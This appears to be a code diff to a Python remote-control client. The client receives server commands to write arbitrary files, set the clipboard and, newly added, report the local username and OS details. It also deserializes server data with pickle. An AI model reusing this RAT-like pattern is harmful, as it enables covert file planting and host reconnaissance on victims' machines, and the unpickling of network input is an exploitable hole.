@@ -1,6 +1,7 @@
 import logging
 import os
 import pickle
+import platform
 import socket
 import subprocess
 import time
@@ -117,29 +118,17 @@ class Client(object):
             serverPublic = serialization.load_pem_public_key(self.socket.recv(20480), backend=default_backend())
 
             Hashed_Key = Hasher(self.Fer_key)
-            self.socket.send(Hashed_Key)
-            if not self.socket.recv(1024) == b'<RECEIVED>':
-                raise Exception
-
             Encrypted = encrypt(serverPublic, self.Fer_key)
-            self.socket.send(Encrypted)
-            if not self.socket.recv(1024) == b'<RECEIVED>':
-                raise Exception
-
             Hash_Encrypted = Hasher(Encrypted)
-            self.socket.send(Hash_Encrypted)
-            if not self.socket.recv(1024) == b'<RECEIVED>':
-                raise Exception
-
             Signature = sign(self.privateKey, Hashed_Key)
-            self.socket.send(Signature)
-            if not self.socket.recv(1024) == b'<RECEIVED>':
-                raise Exception
+            Encrypted_Signature = sign(self.privateKey, Hash_Encrypted)
 
-            Encryped_Signature = sign(self.privateKey, Hash_Encrypted)
-            self.socket.send(Encryped_Signature)
-            if not self.socket.recv(1024) == b'<RECEIVED>':
-                raise Exception
+            data = pickle.dumps({'Hashed_Key': Hashed_Key, 'Encrypted': Encrypted, 'Hash_Encrypted': Hash_Encrypted, 'Signature': Signature, 'Encrypted_Signature': Encrypted_Signature})
+
+            self.socket.send(str(len(data)).encode())
+            self.socket.recv(4096)
+            self.socket.send(data)
+            self.socket.recv(4096)
             self.send(socket.gethostname().encode())
         except Exception as e:
             logging.error(e)
@@ -180,10 +169,8 @@ class Client(object):
                 self.send(b'<READY>')
                 packed_data = self.receive()
                 filedata = pickle.loads(packed_data)
-                filename = filedata['filename']
-                content = filedata['data']
-                with open(filename, 'wb') as f:
-                    f.write(content)
+                with open(filedata['filename'], 'wb') as f:
+                    f.write(filedata['data'])
                 self.send(b'File Transfer Successful')
                 continue
 
@@ -191,6 +178,10 @@ class Client(object):
                 self.send(b'<READY>')
                 pyperclip.copy(self.receive().decode())
                 self.send(b'<READY>')
+                continue
+            
+            if data == b'<INFO>':
+                self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
                 continue
 
 
@@ -237,12 +228,13 @@ def main():
     client = Client()
     client.socket_create()
     while True:
-        try:
-            client.socket_connect()
-        except:
-            time.sleep(5)
-        else:
-            break
+        #try:
+        client.socket_connect()
+        break
+        #except:
+        #    time.sleep(5)
+        #else:
+        #    break
     try:
         client.receive_commands()
     except Exception as e:
